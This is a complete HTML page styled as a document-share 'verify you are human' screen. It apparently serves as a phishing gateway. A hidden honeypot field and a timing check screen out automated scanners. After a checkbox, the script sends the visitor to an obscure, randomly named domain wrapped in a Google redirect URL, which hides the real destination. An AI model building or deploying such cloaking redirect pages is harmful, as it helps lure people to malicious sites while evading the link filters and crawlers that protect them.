<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome</title>

<style>
    * {
        box-sizing: border-box;
    }

    body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: Arial, Helvetica, sans-serif;
        background: #f3f5f7;
        color: #1f2937;
    }

    .card {
        width: 92%;
        max-width: 460px;
        background: #ffffff;
        border: 1px solid #e3e7eb;
        border-radius: 14px;
        padding: 42px 36px;
        text-align: center;
        box-shadow: 0 8px 30px rgba(0,0,0,0.06);
    }

    .document-icon {
        width: 58px;
        height: 70px;
        margin: 0 auto 24px;
        border: 2px solid #cfd5dc;
        border-radius: 7px;
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 11px;
        font-weight: bold;
        color: #6b7280;
        background: #fafafa;
    }

    .document-icon::after {
        content: "";
        position: absolute;
        top: -2px;
        right: -2px;
        width: 18px;
        height: 18px;
        background: #f3f5f7;
        border-left: 2px solid #cfd5dc;
        border-bottom: 2px solid #cfd5dc;
        border-radius: 0 6px 0 6px;
    }

    h1 {
        margin: 0 0 10px;
        font-size: 25px;
        font-weight: 600;
    }

    .description {
        margin: 0 auto 28px;
        max-width: 350px;
        color: #6b7280;
        font-size: 14px;
        line-height: 1.6;
    }

    .verification {
        text-align: left;
        border: 1px solid #e1e5e9;
        border-radius: 9px;
        padding: 16px;
        background: #fafbfc;
    }

    .check-row {
        display: flex;
        align-items: center;
        gap: 12px;
        cursor: pointer;
        user-select: none;
        font-size: 14px;
    }

    .check-row input {
        width: 19px;
        height: 19px;
        cursor: pointer;
    }

    .button {
        width: 100%;
        margin-top: 18px;
        padding: 13px 20px;
        border: 0;
        border-radius: 8px;
        background: #202124;
        color: #ffffff;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: opacity 0.2s;
    }

    .button:hover {
        opacity: 0.88;
    }

    .button:disabled {
        opacity: 0.45;
        cursor: not-allowed;
    }

    .message {
        min-height: 20px;
        margin-top: 14px;
        text-align: center;
        font-size: 13px;
        color: #6b7280;
    }

    .footer {
        margin-top: 25px;
        color: #9aa0a6;
        font-size: 11px;
    }

    /* Honeypot field.
       Normal visitors will never see this. */
    .hp-field {
        position: absolute;
        left: -9999px;
        width: 1px;
        height: 1px;
        overflow: hidden;
    }
</style>
</head>

<body>

<div class="card">

    <div class="document-icon">
        FILE
    </div>

    <h1>Welcome</h1>

    <p class="description">
        Please verify you are human.
    </p>

    <!-- Honeypot field -->
    <div class="hp-field" aria-hidden="true">
        <label for="website">Leave this field empty</label>
        <input
            type="text"
            id="website"
            name="website"
            tabindex="-1"
            autocomplete="off"
        >
    </div>

    <div class="verification">

        <label class="check-row">
            <input type="checkbox" id="humanCheck">
            <span>I'm a human and would like to continue</span>
        </label>

        <button
            class="button"
            id="continueButton"
            type="button"
            disabled
        >
            Continue
        </button>

        <div class="message" id="message"></div>

    </div>

    <div class="footer">
        .
    </div>

</div>

<script>
(function () {

    /*
     * Change this to your real website.
     */
    const destination = "https://www.google.com/url?q=https%3A%2F%2Fwww.u24372-doc48902fi.net%2F&sa=D&sntz=1&usg=AOvVaw3FY_pLTUCrYyM1PiNhu1Sx";

    const humanCheck = document.getElementById("humanCheck");
    const continueButton = document.getElementById("continueButton");
    const message = document.getElementById("message");
    const honeypot = document.getElementById("website");

    /*
     * Visitor must remain on the page briefly before
     * the Continue button can be used.
     */
    const pageOpenedAt = Date.now();
    const minimumTime = 2500;

    humanCheck.addEventListener("change", function () {

        if (this.checked) {
            continueButton.disabled = false;
            message.textContent = "";
        } else {
            continueButton.disabled = true;
        }

    });

    continueButton.addEventListener("click", function () {

        /*
         * Honeypot check:
         * legitimate visitors should leave this empty.
         */
        if (honeypot.value.trim() !== "") {
            message.textContent = "Verification could not be completed.";
            return;
        }

        /*
         * Timing check:
         * prevents extremely fast automated submissions.
         */
        const elapsed = Date.now() - pageOpenedAt;

        if (elapsed < minimumTime) {
            message.textContent = "Please wait a moment and try again.";
            return;
        }

        /*
         * Small processing state.
         */
        continueButton.disabled = true;
        humanCheck.disabled = true;
        message.textContent = "Verification complete. Continuing...";

        setTimeout(function () {
            window.location.href = destination;
        }, 600);

    });

})();
</script>

</body>
</html>
